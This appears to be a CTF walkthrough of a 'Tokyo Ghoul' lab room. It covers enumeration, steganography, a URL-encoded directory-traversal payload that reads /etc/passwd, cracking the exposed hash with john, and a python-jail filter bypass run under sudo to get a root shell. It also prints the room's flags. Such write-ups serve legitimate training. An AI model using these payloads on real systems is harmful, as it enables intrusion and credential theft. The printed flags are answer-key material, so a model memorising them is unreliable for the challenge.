# Tokyo Ghoul

## Description

Help kaneki escape jason room

## [Task 1] About the room

This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime.

Alert: This room can contain some spoilers 'only s1 and s2 ' so if you are interested to watch the anime, wait till you finish the anime and come back to do the room 

The machine will take some time, just go grab some water or make a coffee.

This room contains some non-pg13 elements in the form of narrative descriptions. Please proceed only at your own comfort level.

Ok. Let's deploy the machine. BTW, I follow the story, I know we can approach this room like a real senario, but let's respect the author's effort and story. : )

No answers needed for this task.

## [Task 2] Where am i ?

Let's do some scanning.

Ok. Let's run an Nmap scan. The scan reveals three open ports:
* 21 ftp
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.209
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome To Tokyo goul
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Open ports: `3`

OS: `Ubuntu`

## [Task 3] Planning to escape

Try to look around any thing would be useful.

### Did you find the note that the others ghouls gave you? where did you find it?

Let's head to the webpage. In the last line, there is a link to an html page were we can get help:

~~~html
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Tokyo_Ghoul]
└─$ curl -s "http://$IP/"            

[REDACTED]

	<a href="jasonroom.html">Can you help him escape?</a>

~~~

Let's see what we have here:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Tokyo_Ghoul]
└─$ curl -s "http://$IP/jasonroom.html"

[REDACTED]

	<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->

~~~

Found the note in: `jasonroom.html`

### What is the key for Rize executable?

Let's head to the ftp service and login as anonymous to find help. There were three files in there. There is a txt file named `Aogiri_tree.txt`, an executable named `need_to_talk`, and an image named `rize_and_kaneki.jpg`. Let's check the txt file first:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ cat Aogiri_tree.txt 
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will. 
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
~~~

Ok. I ran the executable and it asks for a passphrase. The passphrase is not in the text file, so I ran `strings` command to read the strings inside the binary and found the passphrase:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ strings need_to_talk

[REDACTED]

You_founH
d_1t
[]A\A]A^A_
kamishiro       <----------------------
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

[REDACTED]
~~~

Executable's key: `kamishiro`

### Use a tool to get the other note from Rize.

Let's enter the key and see what happens:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ ./need_to_talk
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> kamishiro
Good job. I believe this is what you came for:
You_found_1t
~~~

From the question, it seems like there is a hidden note. My first guess was the image. I used `steghide` and the string we just got (`You_found_1t`) to extract the note from the image:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ steghide extract -sf rize_and_kaneki.jpg
Enter passphrase: 
wrote extracted data to "yougotme.txt".
~~~

We successfully extraced a file naemd `yougotme.txt`

## [Task 4] What Rize is trying to say?

You should help me , i can't support pain aghhhhhhh

### What the message mean did you understand it? what it says?

Let's see the content of the note:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ cat yougotme.txt   
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..


if you can talk it allright you got my secret directory
~~~

We are given a morse code. I decoded it with following pattern using [CyberChef](https://gchq.github.io/CyberChef/) and found the secret directory:

Morse Code -> Hex -> Base64

Secret directory: `d1r3c70ry_center`

### Can you see the weakness in the dark? no? just search

Let's see what this directory has to offer:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ curl -s "http://$IP/d1r3c70ry_center/" | html2text
****** Scan me ******
[scanme.gif]
Scan me scan me scan all my ideas aaaaahhhhhhhh
~~~

"Scan me?". Ok. I ran `gobuster` on this directory to find the subdirectories:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP/d1r3c70ry_center/                             
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.65.121/d1r3c70ry_center/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/30 12:06:09 Starting gobuster in directory enumeration mode
===============================================================
/claim                (Status: 301) [Size: 329] [--> http://10.10.65.121/d1r3c70ry_center/claim/]
~~~

We found `/claim`. Let's see the content:

~~~html
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ curl -s "http://$IP/d1r3c70ry_center/claim/"            
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
 <p><b>Welcome Kankei-Ken</b><br><br>So you are here , you make the desision , you really want the power ? 
 Will you accept me? 
 Will accept your self as a ghoul?</br></p>
    <img src='https://i.imgur.com/9joyFGm.gif'>    </body>
</html>
~~~

#### LFI

Here we have three buttons and two of them run a function in `index.php` with `view` as the parameter. We might be able to use LFI. I tried simple LFI but I got and error:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ curl -s "http://$IP/d1r3c70ry_center/claim/index.php?view=../../../../etc/passwd" | html2text 

Main_Page NO YES
no no no silly don't do that
~~~

Next I tried to urlencode it and it worked and we can see the content of `/etc/passwd`. Now we know Rize's username:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ curl -s "http://$IP/d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd"

[REDACTED]

<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
statd:x:110:65534::/var/lib/nfs:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash  <--------
~~~

### What did you find something ? crack it

No answers needed.

### what is rize username?

Rize's username: `kamishiro`

### what is rize password?

Now that we have a username and password hash, we can either brute-force the ssh service or we can try try to crack the password hash. I decided to crack the hash. I used `john` and `rockyou` wordlist:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tokyo_Ghoul/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt rize.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2021-10-30 12:37) 1.136g/s 1745p/s 1745c/s 1745C/s kucing..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

Rize's password: `password123`

## [Task 5] Fight Jason

Finnaly i got Rize kagune help me fight Jason and get root.

### user.txt

Now that we have the credentials (`kamishiro:password123`), let's connect to the machine via ssh. I found the user flag in kamishiro's home directory:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Tokyo_Ghoul]
└─$ ssh kamishiro@$IP
kamishiro@10.10.217.179's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 23 22:29:38 2021 from 192.168.77.1
kamishiro@vagrant:~$ id
uid=1001(kamishiro) gid=1001(kamishiro) groups=1001(kamishiro)
kamishiro@vagrant:~$ ls
jail.py  user.txt
kamishiro@vagrant:~$ cat user.txt 
e6215e25c0783eb4279693d9f073594a
~~~

user.txt: `e6215e25c0783eb4279693d9f073594a`

### root.txt

Now we need to gain root access in order to obtain the root flag. Let's check our sudo permissions by running `sudo -l`:

~~~
kamishiro@vagrant:~$ sudo -l
[sudo] password for kamishiro: 
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
~~~

As you can see, we can run a python script named `jail.py` which is located in our home directory using `python3`, with sudo and no password. Let's take a look at the script:

#### Escaping python jail

~~~py
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
~~~

What we have here, is called a `python jail` and it is very common in CTFs. The program checks for existence of eval, exec, import, open, os, read, system, write in our input and the challenge is to somehow bypass this filter. We need to use python builtins to break out of this jail. You can read [this article](https://anee.me/escaping-python-jails-849c65cf306e) for a full description on how to do so.

The program in the article is very similar to what we have here. So I used their method to escape. Enter the following input and you'll get a root shell:

~~~py
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
~~~

~~~
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
[sudo] password for kamishiro: 
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
root@vagrant:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Great! Now we can read the root flag located in `/root`:

~~~
root@vagrant:~# cd /root
root@vagrant:/root# ls 
root.txt
root@vagrant:/root# cat root.txt 
9d790bb87898ca66f724ab05a9e6000b
~~~

root.txt: `9d790bb87898ca66f724ab05a9e6000b`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something!

Have a g00d one! : )